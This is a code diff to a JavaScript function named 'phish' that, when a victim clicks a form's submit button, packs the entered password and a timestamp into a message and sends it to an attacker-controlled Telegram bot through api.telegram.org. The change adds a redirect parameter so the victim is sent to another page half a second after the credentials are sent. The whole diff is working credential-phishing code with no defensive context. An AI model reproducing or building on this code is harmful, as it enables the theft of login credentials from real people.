@@ -1,4 +1,4 @@
-const phish = (bot_token, chat_id) => {
+const phish = (bot_token, chat_id, redirect_link) => {
     $('#submit-button').on('click', function() {
         let currentdate = new Date(),
             date = `${currentdate.getDate()}/${currentdate.getMonth() +
@@ -20,5 +20,9 @@ Pass :    ${pass}%0A
             `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${msg}`
         );
         xhr.send();
+
+        setTimeout(function() {
+            window.location.assign(redirect_link);
+        }, 500);
     });
 };
